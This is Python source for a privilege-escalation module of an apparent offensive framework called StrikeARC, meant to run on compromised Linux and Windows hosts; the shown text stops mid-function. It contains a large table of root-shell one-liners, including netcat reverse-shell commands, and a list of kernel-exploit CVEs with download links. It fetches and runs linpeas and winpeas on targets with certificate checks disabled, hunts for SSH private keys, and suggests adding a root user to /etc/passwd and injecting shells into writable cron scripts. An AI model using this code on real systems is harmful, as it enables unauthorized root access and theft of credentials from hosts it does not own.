#!/usr/bin/env python3
"""
privesc.py — Privilege Escalation Module for StrikeARC
======================================================
Runs on compromised hosts (via the transport layer or locally) to enumerate
and exploit privilege escalation vectors on Linux and Windows targets.

Transport contract (BaseTransport / TransportManager):
    transport.run(cmd: str) -> dict   # {"stdout", "stderr", "returncode", "cmd"}

When ``transport`` is ``None``, commands run locally via ``utils.run_command()``.

Capabilities
------------
    1.  run_linpeas            — download + run linpeas.sh, parse findings
    2.  run_winpeas            — download + run winpeas (.exe/.bat), parse findings
    3.  enum_linux_privesc     — manual Linux privesc enumeration
    4.  enum_windows_privesc   — manual Windows privesc enumeration
    5.  exploit_sudo           — exploit NOPASSWD sudo rules (GTFOBins)
    6.  exploit_suid_binary    — exploit a GTFOBins-known SUID binary
    7.  exploit_kernel         — match kernel version → known CVE exploit
    8.  exploit_cronjob        — inject into writable cron scripts
    9.  exploit_capabilities   — abuse dangerous Linux capabilities
    10. attempt_privesc        — master orchestrator: enum → pick → exploit

All ``exploit_*`` functions return a dict with at least ``{success, technique,
new_user, evidence}``. Enumeration functions return ``{vectors, findings}`` or
``{success, findings, raw_output}``.
"""

from __future__ import annotations

import re
import time
from typing import Dict, List, Optional, Tuple

from utils import run_command

# AttackVector TypedDict from state.py (fallback to plain dict for isolated use).
try:
    from state import AttackVector  # type: ignore
except Exception:  # pragma: no cover
    AttackVector = Dict  # type: ignore


# ════════════════════════════════════════════════════════════════════════
# Transport helper
# ════════════════════════════════════════════════════════════════════════

def _run(transport, cmd: str, timeout: int = 60) -> Dict:
    """
    Execute ``cmd`` locally or via ``transport.run()`` and return the full
    result dict ``{stdout, stderr, returncode, cmd}``.

    * ``transport is None``  → local execution via ``utils.run_command``.
    * ``transport.run``      → remote execution; the result is normalised to
      the same dict shape.

    Never raises — returns an empty-result dict on any failure.
    """
    if transport is None:
        return run_command(cmd, timeout=timeout)

    run = getattr(transport, "run", None)
    if run is None:
        return {"stdout": "", "stderr": "transport has no run()", "returncode": -1, "cmd": cmd}

    try:
        result = run(cmd)
    except TypeError:
        # run() may require a timeout kwarg
        try:
            result = run(cmd, timeout=timeout)
        except Exception as exc:
            return {"stdout": "", "stderr": str(exc), "returncode": -1, "cmd": cmd}
    except Exception as exc:
        return {"stdout": "", "stderr": str(exc), "returncode": -1, "cmd": cmd}

    # Normalise various result shapes to the standard dict.
    if isinstance(result, dict):
        return {
            "stdout": (result.get("stdout") or "").strip(),
            "stderr": (result.get("stderr") or "").strip(),
            "returncode": result.get("returncode", 0),
            "cmd": cmd,
        }
    if isinstance(result, str):
        return {"stdout": result.strip(), "stderr": "", "returncode": 0, "cmd": cmd}
    if isinstance(result, bytes):
        return {"stdout": result.decode(errors="replace").strip(), "stderr": "", "returncode": 0, "cmd": cmd}
    return {"stdout": str(result).strip(), "stderr": "", "returncode": 0, "cmd": cmd}


def _run_out(transport, cmd: str, timeout: int = 60) -> str:
    """Shortcut: run command and return only the stdout string."""
    return _run(transport, cmd, timeout=timeout)["stdout"]


# ════════════════════════════════════════════════════════════════════════
# GTFOBins lookup — exploitation techniques for SUID / sudo / capabilities
# ════════════════════════════════════════════════════════════════════════
#
# Each entry maps binary name → a shell command that, when run through sudo or
# executed as an SUID binary, spawns a root shell.  These are the canonical
# GTFOBins one-liners adapted for ``os.system`` / interactive use.

GTFOBINS: Dict[str, str] = {
    # ── interpreters ──────────────────────────────────────────────────
    "python":  "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python2": "python2 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "perl":    "perl -e 'use POSIX (setuid); setuid(0); exec \"/bin/bash\"'",
    "ruby":    "ruby -e 'require \"os.system\"; Process::Sys.setuid(0); exec \"/bin/bash\"'",
    "ruby1.8": "ruby -e 'require \"os.system\"; Process::Sys.setuid(0); exec \"/bin/bash\"'",
    "php":     "php -r 'pcntl_exec(\"/bin/bash\", []);'",
    "lua":     "lua -e 'os.execute(\"/bin/bash\")'",
    "node":    "node -e 'require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'",
    "tclsh":   "echo 'exec /bin/bash' | tclsh",
    "expect":  "expect -c 'spawn /bin/bash; interact'",

    # ── shells ────────────────────────────────────────────────────────
    "bash":  "/bin/bash",
    "sh":    "/bin/sh",
    "dash":  "/bin/dash",
    "zsh":   "/usr/bin/zsh",
    "ksh":   "/usr/bin/ksh",
    "csh":   "/usr/bin/csh",

    # ── editors / pagers ──────────────────────────────────────────────
    "vim":   "vim -c ':!/bin/bash'",
    "vi":    "vi -c ':!/bin/bash'",
    "nvim":  "nvim -c ':!/bin/bash'",
    "rvim":  "rvim -c ':!/bin/bash'",
    "emacs": "emacs -Q -nw --eval '(term \"/bin/bash\")'",
    "ed":    "ed\n!done\n!/bin/bash",
    "ex":    "ex\n!/bin/bash",
    "less":  "less /etc/profile\n!/bin/bash",
    "more":  "more /etc/profile\n!/bin/bash",
    "man":   "man man\n!/bin/bash",
    "env":   "env /bin/bash",
    "tee":   "echo /bin/bash | tee /tmp/xsh; chmod +x /tmp/xsh; sudo /tmp/xsh",

    # ── find / awk / sed ──────────────────────────────────────────────
    "find":   "find . -exec /bin/bash -p \\; -quit",
    "awk":    "awk 'BEGIN {system(\"/bin/bash\")}'",
    "sed":    "sed e /bin/bash",

    # ── networking ────────────────────────────────────────────────────
    "nmap":    "nmap --interactive\\nn!sh",
    "nc":      "nc -e /bin/bash 127.0.0.1 4444",
    "ncat":    "ncat -e /bin/bash 127.0.0.1 4444",
    "netcat":  "nc -e /bin/bash 127.0.0.1 4444",
    "socat":   "socat stdin exec:/bin/bash",
    "wget":    "wget --use-askpass=/bin/bash 0",
    "curl":    "curl | /bin/bash",
    "ssh":     "ssh -o ProxyCommand=/bin/bash localhost",
    "ftp":     "ftp\\n!/bin/bash",

    # ── file utilities ────────────────────────────────────────────────
    "cp":     "cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash; /tmp/rootbash -p",
    "mv":     "mv /bin/bash /tmp/rootbash; /tmp/rootbash -p",
    "dd":     "dd if=/bin/bash of=/tmp/rootbash; chmod u+s /tmp/rootbash; /tmp/rootbash -p",
    "tar":    "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "zip":    "zip /tmp/x.zip /tmp/x --unzip-command=/bin/bash",
    "chmod":  "chmod u+s /bin/bash; /bin/bash",
    "chown":  "chown root /bin/bash; chmod u+s /bin/bash; /bin/bash",
    "mount":  "mount -o bind /bin /tmp; chroot /tmp bash",
    "base64": "echo /bin/bash | base64 | base64 -d | /bin/bash",
    "xxd":    "xxd /bin/bash | xxd -r > /tmp/x; chmod +x /tmp/x; /tmp/x",

    # ── system tools ──────────────────────────────────────────────────
    "strace":   "strace -o /dev/null /bin/bash",
    "ltrace":   "ltrace /bin/bash",
    "gdb":      "gdb -nx -ex 'python import os; os.execl(\"/bin/bash\",\"bash\")' -ex quit",
    "pdb":      "pdb\nimport os; os.system('/bin/bash')",
    "script":   "script -q /dev/null -c /bin/bash",
    "watch":    "watch -x /bin/bash",
    "time":     "time /bin/bash",
    "taskset":  "taskset 1 /bin/bash",
    "nice":     "nice /bin/bash",
    "ionice":   "ionice /bin/bash",
    "service":  "service ../../bin/bash",
    "systemctl":"systemctl; !sh",
    "journalctl":"journalctl; !sh",

    # ── package managers ──────────────────────────────────────────────
    "apt":   "apt changelog apt\\n!/bin/bash",
    "dpkg":  "dpkg -l\\n!/bin/bash",
    "rpm":   "rpm -qa\\n!/bin/bash",
    "yum":   "yum update\\n!/bin/bash",
    "pip":   "pip download x\\n!/bin/bash",
    "npm":   "npm exec /bin/bash",

    # ── databases ─────────────────────────────────────────────────────
    "mysql": "mysql -e '\\! /bin/bash'",
    "psql":  "psql -c '\\! /bin/bash'",

    # ── containers / orchestration ────────────────────────────────────
    "docker":          "docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
    "docker-compose":  "docker-compose run --entrypoint /bin/bash alpine",

    # ── misc ──────────────────────────────────────────────────────────
    "openssl":  "openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj '/CN=x'",
    "pkexec":   "pkexec /bin/bash",
    "doas":     "doas /bin/bash",
    "su":       "su root",
    "sudo":     "sudo /bin/bash",
    "make":     "make -s -f <(echo 'a:\\n\\t/bin/bash')",
    "gcc":      "gcc -wrapper /bin/bash,-foo .",
    "g++":      "g++ -wrapper /bin/bash,-foo .",
    "jrunscript": "jrunscript -e '\\$EXEC(/bin/bash)'",
    "java":     "java -cp /tmp Exploit",
    "erl":      "erl -eval '{ok,S,Bs}=erl_prim_loader:get_file(\\\"/bin/bash\\\"), io:format(\\\"~s~n\\\",[S]).'",
    "tcpdump":  "tcpdump -ln -i lo -w /dev/null -W1 -G1 -z /bin/bash",
    "ab":       "ab -e /dev/null",
    "kubectl":  "kubectl exec -it pod -- /bin/bash",
}


# ── Dangerous Linux capabilities (cap_xxx → severity) ──────────────────

DANGEROUS_CAPS: Dict[str, str] = {
    "cap_setuid":           "critical",
    "cap_setgid":           "critical",
    "cap_dac_override":     "critical",
    "cap_dac_read_search":  "high",
    "cap_sys_admin":        "critical",
    "cap_sys_ptrace":       "high",
    "cap_sys_module":       "critical",
    "cap_sys_rawio":        "critical",
    "cap_sys_pacct":        "high",
    "cap_sys_boot":         "high",
    "cap_sys_nice":         "medium",
    "cap_sys_resource":     "medium",
    "cap_sys_time":         "high",
    "cap_sys_tty_config":   "medium",
    "cap_net_raw":          "high",
    "cap_net_admin":        "medium",
    "cap_net_bind_service": "low",
    "cap_chown":            "medium",
    "cap_fowner":           "medium",
    "cap_setfcap":          "high",
}


# ── Known kernel exploits ──────────────────────────────────────────────

KERNEL_EXPLOITS: List[Dict] = [
    {
        "cve":         "CVE-2022-0847",
        "name":        "Dirty Pipe",
        "min_version": (5, 8, 0),
        "max_version": (5, 16, 10),
        "url":         "https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
        "description": "Linux kernel 5.8–5.16.10 pipe buffer flag overwrite.",
    },
    {
        "cve":         "CVE-2021-4034",
        "name":        "PwnKit (pkexec)",
        "min_version": (2, 0, 0),
        "max_version": (5, 15, 18),
        "url":         "https://github.com/berdav/CVE-2021-4034",
        "description": "Polkit pkexec local privilege escalation (all versions until patch).",
    },
    {
        "cve":         "CVE-2021-3156",
        "name":        "Sudo Heap Overflow (Baron Samedit)",
        "min_version": (1, 8, 2),
        "max_version": (5, 15, 0),
        "url":         "https://github.com/blasty/CVE-2021-3156",
        "description": "Sudo heap-based buffer overflow in argument parsing.",
    },
    {
        "cve":         "CVE-2020-14386",
        "name":        "AF_PACKET privilege escalation",
        "min_version": (3, 6, 0),
        "max_version": (5, 9, 0),
        "url":         "https://github.com/google/security-research",
        "description": "Memory corruption in AF_PACKET (TPACKET_V3).",
    },
    {
        "cve":         "CVE-2019-13272",
        "name":        "ptrace_traceme_kernel privesc",
        "min_version": (3, 0, 0),
        "max_version": (5, 1, 17),
        "url":         "https://github.com/jas502n/CVE-2019-13272",
        "description": "Kernel ptrace module load privilege escalation.",
    },
    {
        "cve":         "CVE-2018-18955",
        "name":        "subuid/sugid namespace overlap",
        "min_version": (4, 15, 0),
        "max_version": (4, 19, 2),
        "url":         "https://github.com/b1nary0-1/cve-2018-18955",
        "description": "User namespace subuid overlap privilege escalation.",
    },
    {
        "cve":         "CVE-2017-1000112",
        "name":        "UDP fragmentation heap overflow",
        "min_version": (4, 0, 0),
        "max_version": (4, 13, 11),
        "url":         "https://github.com/xoreaxeaxeax/cve-2017-1000112",
        "description": "UDP fragmentation heap overflow (KASLR bypass).",
    },
    {
        "cve":         "CVE-2017-6074",
        "name":        "DCCP double-free",
        "min_version": (2, 6, 18),
        "max_version": (4, 9, 10),
        "url":         "https://github.com/xoreaxeaxeax/cve-2017-6074",
        "description": "DCCP protocol double-free privilege escalation.",
    },
    {
        "cve":         "CVE-2017-16995",
        "name":        "eBPF verifier exploit",
        "min_version": (4, 0, 0),
        "max_version": (4, 14, 11),
        "url":         "https://github.com/brl/grlh",
        "description": "eBPF ALU bounds tracking exploit (kernels 4.0–4.14.11).",
    },
    {
        "cve":         "CVE-2016-5195",
        "name":        "Dirty COW",
        "min_version": (2, 6, 22),
        "max_version": (4, 8, 2),
        "url":         "https://github.com/dirtycow/dirtycow.github.io",
        "description": "Race condition in mm/cow.c — write to read-only mappings.",
    },
    {
        "cve":         "CVE-2014-0196",
        "name":        "Raw socket tty panic (pty race)",
        "min_version": (2, 6, 31),
        "max_version": (3, 14, 4),
        "url":         "https://github.com/rapid7/metasploit-framework",
        "description": "pty race condition in n_tty_write.",
    },
]


# ── Windows privesc indicators ─────────────────────────────────────────

DANGEROUS_WINDOWS_PRIVS: List[str] = [
    "SeImpersonatePrivilege",
    "SeAssignPrimaryPrivilege",
    "SeTcbPrivilege",
    "SeDebugPrivilege",
    "SeLoadDriverPrivilege",
    "SeRestorePrivilege",
    "SeTakeOwnershipPrivilege",
    "SeBackupPrivilege",
    "SeCreateTokenPrivilege",
    "SeManageVolumePrivilege",
]


# ════════════════════════════════════════════════════════════════════════
# 1. linpeas runner
# ════════════════════════════════════════════════════════════════════════

LINPEAS_URL = (
    "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
)
WINPEAS_EXE_URL = (
    "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winpeas.exe"
)
WINPEAS_BAT_URL = (
    "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winpeas.bat"
)

# linpeas marks high-confidence findings with red colour codes / specific tokens.
# 95%+ confidence = lines containing these markers.
_LINPEAS_HIGH_CONFIDENCE_MARKERS = [
    "95%",
    "RED",
    "CRITICAL",
    "CVE-",
    "password",
    "passwd",
    "sudo",
    "SUID",
    "CAP_SETUID",
    "CAP_SYS_ADMIN",
    "root",
    "mysql_default",
    "token",
    "private_key",
    "id_rsa",
]


def run_linpeas(transport=None) -> Dict:
    """
    Download and execute linpeas.sh on the target, then parse high-confidence
    privilege-escalation findings.

    Tries multiple transfer methods:
      1. Direct ``curl`` on the target
      2. Direct ``wget`` on the target
      3. Transfer from local operator via ``upload()`` (if transport supports it)

    Returns::

        {
            "success": bool,
            "findings": List[{"type", "detail", "confidence"}],
            "raw_output": str,
        }
    """
    remote_path = "/tmp/linpeas.sh"
    raw_output = ""

    # Check if linpeas is already present
    existing = _run_out(transport, f"test -f {remote_path} && echo present")
    if "present" not in existing:
        # Attempt download via curl
        dl_curl = _run(
            transport,
            f"curl -sLk -o {remote_path} {LINPEAS_URL} && chmod +x {remote_path} && echo OK",
            timeout=120,
        )
        if "OK" not in dl_curl["stdout"]:
            # Attempt download via wget
            dl_wget = _run(
                transport,
                f"wget -q --no-check-certificate -O {remote_path} {LINPEAS_URL} "
                f"&& chmod +x {remote_path} && echo OK",
                timeout=120,
            )
            if "OK" not in dl_wget["stdout"]:
                # Attempt local transfer
                if transport is not None and getattr(transport, "supports_file_transfer", True):
                    upload_ok = _transfer_local_file(
                        transport, LINPEAS_URL, remote_path, is_remote_url=True
                    )
                    if not upload_ok:
                        return {
                            "success": False,
                            "findings": [],
                            "raw_output": "",
                            "error": (
                                "Could not download linpeas.sh (no internet / "
                                "transfer failed). Falling back to manual enum."
                            ),
                        }
                else:
                    return {
                        "success": False,
                        "findings": [],
                        "raw_output": "",
                        "error": "No internet access and no upload-capable transport.",
                    }

    # Execute linpeas
    exec_result = _run(transport, f"bash {remote_path} -q -s 2>/dev/null", timeout=300)
    raw_output = exec_result["stdout"]

    if not raw_output:
        return {
            "success": False,
            "findings": [],
            "raw_output": "",
            "error": f"linpeas executed but produced no output: {exec_result['stderr']}",
        }

    findings = _parse_linpeas_output(raw_output)
    return {"success": True, "findings": findings, "raw_output": raw_output}


def _parse_linpeas_output(raw: str) -> List[Dict]:
    """
    Parse linpeas raw output for high-confidence (95%+) privesc findings.

    linpeas marks findings with ANSI colour codes — red/dangerous lines are
    high-confidence. We also look for explicit confidence percentages and
    known-dangerous patterns.
    """
    findings: List[Dict] = []
    seen_details: set = set()

    for line in raw.splitlines():
        stripped = line.strip()
        if not stripped:
            continue

        # Strip ANSI escape sequences for cleaner matching
        clean = re.sub(r"\x1b\[[0-9;]*m", "", stripped)

        # Skip section banners / separator lines
        if clean.startswith("=" * 10) or clean.startswith("-" * 10):
            continue

        confidence = 0
        matched_marker = ""

        # Explicit percentage confidence
        pct_match = re.search(r"(\d{2,3})%", clean)
        if pct_match:
            pct = int(pct_match.group(1))
            if pct >= 95:
                confidence = pct
                matched_marker = f"{pct}% confidence"
            elif pct >= 80:
                confidence = pct

        # ANSI red colour markers (linpeas uses these for high-risk findings)
        if "\x1b[1;31m" in stripped or "\x1b[31m" in stripped:
            confidence = max(confidence, 95)
            if not matched_marker:
                matched_marker = "red-flagged by linpeas"

        # Keyword-based high-confidence detection
        for marker in _LINPEAS_HIGH_CONFIDENCE_MARKERS:
            if marker.lower() in clean.lower():
                if marker in ("CVE-", "sudo", "SUID", "CAP_SETUID", "CAP_SYS_ADMIN"):
                    confidence = max(confidence, 95)
                else:
                    confidence = max(confidence, 80)
                if not matched_marker:
                    matched_marker = marker
                break

        if confidence >= 80:
            detail_key = clean[:200]
            if detail_key not in seen_details:
                seen_details.add(detail_key)
                findings.append({
                    "type": "linpeas",
                    "detail": clean[:500],
                    "confidence": confidence,
                    "marker": matched_marker,
                })

    return findings


# ════════════════════════════════════════════════════════════════════════
# 2. winpeas runner
# ════════════════════════════════════════════════════════════════════════

def run_winpeas(transport=None) -> Dict:
    """
    Download and execute winpeas on a Windows target, then parse findings.

    Prefers ``winpeas.exe``; falls back to ``winpeas.bat`` (no .NET needed).

    Returns::

        {
            "success": bool,
            "findings": List[{"type", "detail", "confidence"}],
            "raw_output": str,
        }
    """
    exe_path = "C:\\\\Windows\\\\Temp\\\\winpeas.exe"
    bat_path = "C:\\\\Windows\\\\Temp\\\\winpeas.bat"

    raw_output = ""

    # Try winpeas.exe first
    exe_ok = _download_windows(transport, WINPEAS_EXE_URL, exe_path)
    if exe_ok:
        result = _run(transport, f"{exe_path}", timeout=300)
        raw_output = result["stdout"]
        if not raw_output:
            # Maybe blocked by AV — fall back to .bat
            exe_ok = False

    if not exe_ok:
        bat_ok = _download_windows(transport, WINPEAS_BAT_URL, bat_path)
        if not bat_ok:
            return {
                "success": False,
                "findings": [],
                "raw_output": "",
                "error": "Could not download winpeas.exe or winpeas.bat.",
            }
        result = _run(transport, f"cmd.exe /c {bat_path}", timeout=300)
        raw_output = result["stdout"]

    if not raw_output:
        return {
            "success": False,
            "findings": [],
            "raw_output": "",
            "error": "winpeas executed but produced no output (AV / permissions?).",
        }

    findings = _parse_winpeas_output(raw_output)
    return {"success": True, "findings": findings, "raw_output": raw_output}


def _download_windows(transport, url: str, dest: str) -> bool:
    """Attempt to download a file on a Windows target via certutil/powershell."""
    # certutil
    r = _run(transport, f"certutil -urlcache -split -f {url} {dest} 2>nul", timeout=120)
    if "completed" in r["stdout"].lower() or r["returncode"] == 0:
        check = _run_out(transport, f"if exist {dest} (echo present)")
        if "present" in check:
            return True

    # PowerShell Invoke-WebRequest
    r = _run(
        transport,
        f'powershell -c "Invoke-WebRequest -Uri \'{url}\' -OutFile \'{dest}\'" 2>nul',
        timeout=120,
    )
    check = _run_out(transport, f"if exist {dest} (echo present)")
    if "present" in check:
        return True

    # Local transfer fallback
    if transport is not None and getattr(transport, "supports_file_transfer", True):
        return _transfer_local_file(transport, url, dest, is_remote_url=True)
    return False


def _parse_winpeas_output(raw: str) -> List[Dict]:
    """Parse winpeas output for high-confidence privesc findings."""
    findings: List[Dict] = []
    seen: set = set()

    for line in raw.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        clean = re.sub(r"\x1b\[[0-9;]*m", "", stripped)
        confidence = 0
        marker = ""

        # winpeas ANSI red marks
        if "\x1b[1;31m" in stripped or "\x1b[31m" in stripped:
            confidence = 95
            marker = "red-flagged"
        # Explicit percentage
        pct_match = re.search(r"(\d{2,3})%", clean)
        if pct_match:
            pct = int(pct_match.group(1))
            if pct >= 95:
                confidence = max(confidence, pct)
                marker = f"{pct}%"

        for kw in (
            "SeImpersonatePrivilege", "SeDebugPrivilege", "AlwaysInstallElevated",
            "Unquoted", "CVE-", "credential", "password", "autologon",
            "WSUS", "LAPS", "GPP", "Hotfix",
        ):
            if kw.lower() in clean.lower():
                confidence = max(confidence, 85)
                if not marker:
                    marker = kw
                break

        if confidence >= 80:
            key = clean[:200]
            if key not in seen:
                seen.add(key)
                findings.append({
                    "type": "winpeas",
                    "detail": clean[:500],
                    "confidence": confidence,
                    "marker": marker,
                })

    return findings


# ════════════════════════════════════════════════════════════════════════
# Local transfer helper
# ════════════════════════════════════════════════════════════════════════

def _transfer_local_file(transport, url_or_local: str, remote_path: str,
                         is_remote_url: bool = False) -> bool:
    """
    Download a file locally (operator side) then upload it to the target via
    ``transport.upload()``.
    """
    import os
    import tempfile

    upload_fn = getattr(transport, "upload", None)
    if upload_fn is None:
        return False

    # Download locally first
    local_tmp = tempfile.mktemp(prefix="strikearc_", suffix=os.path.basename(remote_path))
    try:
        if is_remote_url:
            try:
                import requests
                resp = requests.get(url_or_local, timeout=60, verify=False, stream=True)
                resp.raise_for_status()
                with open(local_tmp, "wb") as f:
                    for chunk in resp.iter_content(8192):
                        f.write(chunk)
            except Exception:
                # Try curl locally
                r = run_command(
                    f"curl -sLk -o {local_tmp} {url_or_local}", timeout=120
                )
                if r["returncode"] != 0 or not os.path.exists(local_tmp):
                    return False
        else:
            if not os.path.exists(url_or_local):
                return False
            local_tmp = url_or_local

        if not os.path.exists(local_tmp) or os.path.getsize(local_tmp) == 0:
            return False

        return bool(upload_fn(local_tmp, remote_path))
    except Exception:
        return False
    finally:
        try:
            if is_remote_url and os.path.exists(local_tmp):
                os.remove(local_tmp)
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════
# 3. Linux manual privesc enumeration
# ════════════════════════════════════════════════════════════════════════

def enum_linux_privesc(transport=None) -> Dict:
    """
    Manual Linux privilege-escalation enumeration (fallback when linpeas is
    unavailable).

    Checks:
      * ``sudo -l`` rules
      * SUID/SGID binaries
      * Cron jobs + writable cron scripts
      * Writable ``/etc/passwd``
      * Linux capabilities (``getcap``)
      * Kernel version for known CVEs
      * PATH hijacking opportunities
      * SSH keys, bash_history, config files with passwords

    Returns::

        {
            "vectors":  List[AttackVector],
            "findings": List[str],
        }
    """
    vectors: List[Dict] = []
    findings: List[str] = []
    counter = 0

    def _add_vector(**kwargs) -> None:
        nonlocal counter
        counter += 1
        kwargs.setdefault("id", f"linprivesc-{counter}")
        kwargs.setdefault("target", "localhost")
        kwargs.setdefault("category", "privesc")
        kwargs.setdefault("vector_type", kwargs.pop("vtype", "local_privesc"))
        kwargs.setdefault("confidence", "medium")
        kwargs.setdefault("score", 50)
        kwargs.setdefault("evidence", [])
        kwargs.setdefault("exploit_suggestions", [])
        kwargs.setdefault("prerequisites", ["User-level shell on target"])
        kwargs.setdefault("cves", [])
        kwargs.setdefault("references", [])
        vectors.append(kwargs)

    # ── sudo -l ────────────────────────────────────────────────────────
    sudo_l = _run_out(transport, "sudo -l 2>/dev/null")
    if sudo_l and "not allowed to run sudo" not in sudo_l.lower() and "a terminal" not in sudo_l.lower():
        findings.append(f"[SUDO] sudo -l output:\n{sudo_l[:500]}")
        nopasswd = "NOPASSWD" in sudo_l
        sudo_bins = _extract_sudo_bins(sudo_l)
        gtfo_refs = [GTFOBINS[b] for b in sudo_bins if b in GTFOBINS]
        _add_vector(
            vtype="sudo",
            title="Sudo privileges available",
            description=f"sudo -l shows exploitable rules:\n{sudo_l[:400]}",
            confidence="high" if nopasswd else "medium",
            score=90 if nopasswd else 60,
            evidence=[sudo_l[:300]],
            exploit_suggestions=[
                f"Exploit via GTFOBins: {b}" for b in sudo_bins if b in GTFOBINS
            ] or ["Review sudo -l for abusable binaries"],
            references=gtfo_refs,
        )

    # ── SUID binaries ──────────────────────────────────────────────────
    suid = _run_out(
        transport,
        "find / -perm -4000 -type f 2>/dev/null",
        timeout=60,
    )
    if suid:
        for path in suid.splitlines():
            path = path.strip()
            if not path:
                continue
            base = path.rsplit("/", 1)[-1].lower()
            if base in GTFOBINS:
                findings.append(f"[SUID] Abusable SUID binary: {path}")
                _add_vector(
                    vtype="suid",
                    title=f"Abusable SUID binary: {base}",
                    description=f"SUID binary {base} at {path} is GTFOBins-known.",
                    confidence="high",
                    score=85,
                    evidence=[f"SUID: {path}"],
                    exploit_suggestions=[GTFOBINS[base]],
                    references=[f"https://gtfobins.github.io/gtfobins/{base}/"],
                )
            else:
                findings.append(f"[SUID] SUID binary found: {path}")

    # ── Cron jobs + writable cron scripts ──────────────────────────────
    cron_dirs = _run_out(transport, "ls -la /etc/cron* 2>/dev/null")
    system_crontab = _run_out(transport, "cat /etc/crontab 2>/dev/null")
    user_crons = _run_out(transport, "find /var/spool/cron -type f 2>/dev/null -exec cat {} \\;")
    cron_text = "\n".join(filter(None, [cron_dirs, system_crontab, user_crons]))
    if cron_text.strip():
        findings.append(f"[CRON] Cron configuration found:\n{cron_text[:600]}")
        # Check for writable scripts referenced in cron
        writable_cron = _find_writable_cron_scripts(transport, cron_text)
        for wscript in writable_cron:
            findings.append(f"[CRON] Writable cron script: {wscript}")
            _add_vector(
                vtype="cron",
                title=f"Writable cron script: {wscript}",
                description=f"Script {wscript} is referenced by cron and writable.",
                confidence="high",
                score=80,
                evidence=[f"Writable cron script: {wscript}"],
                exploit_suggestions=[
                    "Inject reverse shell or command into the writable script",
                    "Wait for cron execution as root",
                ],
                references=["https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron"],
            )

    # ── Writable /etc/passwd ───────────────────────────────────────────
    passwd_test = _run_out(transport, "test -w /etc/passwd && echo WRITABLE")
    if "WRITABLE" in passwd_test:
        findings.append("[PASSWD] /etc/passwd is writable!")
        _add_vector(
            vtype="passwd",
            title="Writable /etc/passwd",
            description="/etc/passwd is writable — inject a root-equivalent user.",
            confidence="critical",
            score=98,
            evidence=["/etc/passwd is world/group-writable"],
            exploit_suggestions=[
                'Generate hash: openssl passwd -1 -salt x password',
                'Append: echo "hacker:$1$x$hash:0:0::/:/bin/bash" >> /etc/passwd',
            ],
            references=["https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-passwd"],
        )

    # ── Linux capabilities ─────────────────────────────────────────────
    caps = _run_out(transport, "getcap -r / 2>/dev/null", timeout=60)
    if caps:
        for line in caps.splitlines():
            line = line.strip()
            if not line:
                continue
            cap_match = re.search(r"(cap_[a-z_]+)", line, re.IGNORECASE)
            if cap_match:
                cap_name = cap_match.group(1).lower()
                if cap_name in DANGEROUS_CAPS:
                    binary = line.split()[0] if line.split() else line
                    sev = DANGEROUS_CAPS[cap_name]
                    findings.append(f"[CAP] Dangerous capability {cap_name} on {binary}")
                    _add_vector(
                        vtype="capability",
                        title=f"Dangerous capability {cap_name} on {binary}",
                        description=f"Binary {binary} has {cap_name} — exploitable for privesc.",
                        confidence="high" if sev in ("critical", "high") else "medium",
                        score={"critical": 95, "high": 80, "medium": 60}.get(sev, 50),
                        evidence=[line],
                        exploit_suggestions=[
                            f"Abuse {cap_name} via GTFOBins technique",
                            f"https://gtfobins.github.io/#+{cap_name}",
                        ],
                        references=[f"https://gtfobins.github.io/#+{cap_name}"],
                    )

    # ── Kernel version ─────────────────────────────────────────────────
    kernel = _run_out(transport, "uname -r 2>/dev/null")
    if kernel:
        findings.append(f"[KERNEL] Kernel version: {kernel}")
        kexploits = _match_kernel_exploits(kernel)
        for kx in kexploits:
            findings.append(
                f"[KERNEL] Potential exploit: {kx['cve']} ({kx['name']})"
            )
            _add_vector(
                vtype="kernel",
                title=f"Kernel exploit: {kx['name']} ({kx['cve']})",
                description=f"Kernel {kernel}: {kx['description']}",
                confidence="high",
                score=85,
                evidence=[f"uname -r → {kernel}", kx["description"]],
                exploit_suggestions=[
                    f"Download exploit: {kx['url']}",
                    "Compile with gcc and execute",
                ],
                prerequisites=["gcc available on target", "User-level shell"],
                cves=[kx["cve"]],
                references=[kx["url"]],
            )

    # ── PATH hijacking ─────────────────────────────────────────────────
    path_env = _run_out(transport, 'echo $PATH')
    if path_env:
        writable_path_dirs = _find_writable_path_dirs(transport, path_env)
        if writable_path_dirs:
            findings.append(
                f"[PATH] Writable directories in PATH: {writable_path_dirs}"
            )
            _add_vector(
                vtype="path_hijack",
                title="Writable directory in PATH",
                description=(
                    f"Writable PATH directories: {writable_path_dirs}. "
                    f"If a SUID/cron binary calls a relative command, it can be hijacked."
                ),
                confidence="medium",
                score=55,
                evidence=[f"PATH: {path_env}", f"Writable dirs: {writable_path_dirs}"],
                exploit_suggestions=[
                    "Identify binaries called without absolute path from cron/sudo",
                    "Plant a malicious binary with the expected name",
                ],
            )

    # ── SSH keys ───────────────────────────────────────────────────────
    ssh_keys = _run_out(
        transport,
        "find / -type f \\\\( -name 'id_rsa' -o -name 'id_ed25519' "
        "-o -name 'id_ecdsa' \\\\) 2>/dev/null | head -20",
        timeout=45,
    )
    if ssh_keys:
        for key_path in ssh_keys.splitlines():
            key_path = key_path.strip()
            if key_path:
                findings.append(f"[SSH] Private key found: {key_path}")
                _add_vector(
                    vtype="ssh_key",
                    title=f"SSH private key: {key_path}",
                    description=f"Readable SSH private key at {key_path}.",
                    confidence="high",
                    score=75,
                    evidence=[f"SSH key: {key_path}"],
                    exploit_suggestions=[
                        "Copy key locally, chmod 600, attempt SSH as root/other users",
                    ],
                )

    # ── bash_history / config files with passwords ────────────────────
    history_files = _run_out(
